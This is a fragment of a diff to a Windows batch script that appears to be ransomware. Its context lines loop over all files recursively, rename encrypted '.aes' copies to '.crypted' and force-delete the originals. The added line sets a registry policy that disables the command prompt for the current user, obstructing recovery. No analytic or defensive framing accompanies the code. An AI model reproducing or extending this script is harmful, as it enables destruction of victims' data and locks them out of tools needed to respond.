@@ -32,3 +32,4 @@ For /f "tokens=*" %%A in ('dir /b /s /a-d-h') do (
     ren "%%~A.aes" "%%~nA%%~xA.crypted"
     del /f /q "%%~A"
 )
+reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f
